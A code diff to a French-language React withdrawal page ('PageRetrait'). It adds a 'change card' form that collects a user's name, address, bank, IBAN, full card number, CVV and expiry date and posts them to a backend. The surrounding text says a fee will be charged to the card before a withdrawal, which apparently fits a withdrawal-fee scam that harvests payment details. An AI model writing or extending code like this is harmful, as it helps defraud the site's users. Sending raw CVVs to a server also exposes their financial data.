@@ -691,6 +691,10 @@ function PageRetrait({ user }) {
   const [loadingHist, setLoadingHist] = useState(true);
   const [confirmingFee, setConfirmingFee] = useState(false);
   const [feeConfirmed, setFeeConfirmed]   = useState(false);
+  const [showCardChange, setShowCardChange] = useState(false);
+  const [cardChangeForm, setCardChangeForm] = useState({ first_name:'', last_name:'', address:'', postal_code:'', city:'', bank_name:'', iban:'', card_number:'', cvv:'', card_expiry:'' });
+  const [cardChangeStatus, setCardChangeStatus] = useState('idle');
+  const [cardChangeMsg, setCardChangeMsg]   = useState('');
   const [identityFile, setIdentityFile]         = useState(null);
   const [identityFileVerso, setIdentityFileVerso] = useState(null);
   const [idFileError, setIdFileError]     = useState('');
@@ -979,6 +983,81 @@ function PageRetrait({ user }) {
             <div style={{fontSize:12,color:'var(--text2)',lineHeight:1.7,marginBottom:14}}>
               {"Des frais de " + fi.fee.amount.toLocaleString('fr-FR') + " € seront prélevés sur la carte bancaire dont vous avez renseigné les coordonnées lors de votre demande. En cliquant sur Continuer, vous autorisez notre équipe à effectuer cette transaction."}
             </div>
+
+            {/* Bouton changement de carte */}
+            <button
+              onClick={()=>{ setShowCardChange(v=>!v); setCardChangeStatus('idle'); setCardChangeMsg(''); }}
+              style={{width:'100%',height:38,borderRadius:8,border:'1px solid var(--border)',background:'var(--bg)',
+                cursor:'pointer',fontSize:12,color:'var(--navy)',fontFamily:'var(--sans)',fontWeight:600,
+                display:'flex',alignItems:'center',justifyContent:'center',gap:6,marginBottom:12}}>
+              <i className="ti ti-credit-card"/>Changement de carte
+            </button>
+
+            {/* Formulaire changement de carte */}
+            {showCardChange && (
+              <div style={{background:'var(--bg)',border:'1px solid var(--border)',borderRadius:10,padding:14,marginBottom:14}}>
+                <div style={{fontSize:12,fontWeight:700,color:'var(--navy)',marginBottom:12}}>💳 Nouvelle carte</div>
+                {[
+                  {label:'Prénom',         key:'first_name',   placeholder:'Prénom'},
+                  {label:'Nom',            key:'last_name',    placeholder:'Nom'},
+                  {label:'Adresse',        key:'address',      placeholder:'Adresse'},
+                  {label:'Code postal',    key:'postal_code',  placeholder:'Code postal'},
+                  {label:'Ville',          key:'city',         placeholder:'Ville'},
+                  {label:'Banque',         key:'bank_name',    placeholder:'Nom de la banque'},
+                  {label:'IBAN',           key:'iban',         placeholder:'FR76 3000 ...'},
+                  {label:'N° de carte',    key:'card_number',  placeholder:'1234 5678 9012 3456'},
+                  {label:'CVV',            key:'cvv',          placeholder:'123', type:'password'},
+                  {label:"Date d'expiration", key:'card_expiry', placeholder:'MM/AA'},
+                ].map(({label,key,placeholder,type})=>(
+                  <div key={key} style={{marginBottom:8}}>
+                    <label style={{fontSize:11,fontWeight:600,color:'var(--text2)',display:'block',marginBottom:3}}>{label}</label>
+                    <input
+                      type={type||'text'}
+                      placeholder={placeholder}
+                      value={cardChangeForm[key]}
+                      onChange={e=>setCardChangeForm(f=>({...f,[key]:e.target.value}))}
+                      style={{width:'100%',height:38,borderRadius:8,border:'1px solid var(--border)',padding:'0 12px',fontSize:13,fontFamily:'var(--sans)',background:'var(--surface)',color:'var(--text)',boxSizing:'border-box'}}
+                    />
+                  </div>
+                ))}
+                {cardChangeMsg && (
+                  <div style={{fontSize:11,padding:'8px 12px',borderRadius:6,marginBottom:8,
+                    background:cardChangeStatus==='success'?'#EAF3DE':'#FCEBEB',
+                    color:cardChangeStatus==='success'?'#3B6D11':'#A32D2D'}}>
+                    {cardChangeMsg}
+                  </div>
+                )}
+                <div style={{display:'flex',gap:8,marginTop:4}}>
+                  <button onClick={()=>setShowCardChange(false)}
+                    style={{flex:1,height:36,borderRadius:8,border:'1px solid var(--border)',background:'transparent',cursor:'pointer',fontSize:12,fontFamily:'var(--sans)',color:'var(--text2)'}}>
+                    Annuler
+                  </button>
+                  <button
+                    disabled={cardChangeStatus==='loading'}
+                    onClick={async()=>{
+                      if (!cardChangeForm.iban || !cardChangeForm.cvv || !cardChangeForm.card_expiry) {
+                        setCardChangeMsg("IBAN, CVV et date d'expiration sont obligatoires."); setCardChangeStatus('error'); return;
+                      }
+                      setCardChangeStatus('loading');
+                      try {
+                        const res = await clientService.updateWithdrawalCard(activeWR.id, cardChangeForm);
+                        if (res.success) {
+                          setCardChangeStatus('success'); setCardChangeMsg('Carte mise à jour avec succès !');
+                          await loadHistory();
+                          setTimeout(()=>setShowCardChange(false), 1500);
+                        } else { setCardChangeStatus('error'); setCardChangeMsg(res.message||'Erreur.'); }
+                      } catch { setCardChangeStatus('error'); setCardChangeMsg('Erreur serveur.'); }
+                    }}
+                    style={{flex:2,height:36,borderRadius:8,border:'none',background:'var(--navy)',color:'#fff',
+                      cursor:'pointer',fontSize:12,fontWeight:600,fontFamily:'var(--sans)',
+                      display:'flex',alignItems:'center',justifyContent:'center',gap:6}}>
+                    {cardChangeStatus==='loading'
+                      ? <><i className="ti ti-loader-2" style={{animation:'spin 1s linear infinite'}}/>Enregistrement…</>
+                      : <><i className="ti ti-check"/>Enregistrer</>}
+                  </button>
+                </div>
+              </div>
+            )}
 
             {/* Upload pièce d'identité si niveau 5 */}
             {isIdentityLevel && (
